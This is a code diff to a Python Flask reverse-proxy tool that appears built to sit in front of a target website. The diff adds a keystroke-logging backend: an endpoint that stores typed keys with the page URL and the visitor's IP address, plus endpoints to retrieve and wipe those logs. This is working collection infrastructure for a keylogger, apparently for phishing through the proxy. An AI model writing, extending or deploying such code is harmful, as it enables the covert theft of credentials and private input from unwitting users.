@@ -12,6 +12,10 @@ if not os.path.exists('requests.json'):
     with open('requests.json', 'w') as f:
         json.dump([], f)
 
+if not os.path.exists('keylogs.json'):
+    with open('keylogs.json', 'w') as f:
+        json.dump([], f)
+
 requests_history = []
 MAX_HISTORY = 50
 
@@ -104,6 +108,40 @@ def start_proxy(target, host, port, secret):
     def clear_history():
         global requests_history
         requests_history = []
+        return jsonify({'status': 'success'})
+
+    @app.route('/ep/api/keylog', methods=['POST'])
+    def save_keylog():
+        data = request.json
+        timestamp = datetime.now().isoformat()
+        
+        log_entry = {
+            'keys': data['keys'],
+            'url': data['url'],
+            'timestamp': timestamp,
+            'ip': request.remote_addr
+        }
+        
+        with open('keylogs.json', 'r') as f:
+            logs = json.load(f)
+            
+        logs.append(log_entry)
+        
+        with open('keylogs.json', 'w') as f:
+            json.dump(logs, f)
+            
+        return jsonify({'status': 'success'})
+
+    @app.route('/ep/api/getKeylog', methods=['GET'])
+    def get_keylog():
+        with open('keylogs.json', 'r') as f:
+            logs = json.load(f)
+        return jsonify(logs)
+
+    @app.route('/ep/api/clearKeylog', methods=['POST'])
+    def clear_keylog():
+        with open('keylogs.json', 'w') as f:
+            json.dump([], f)
         return jsonify({'status': 'success'})
 
     @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
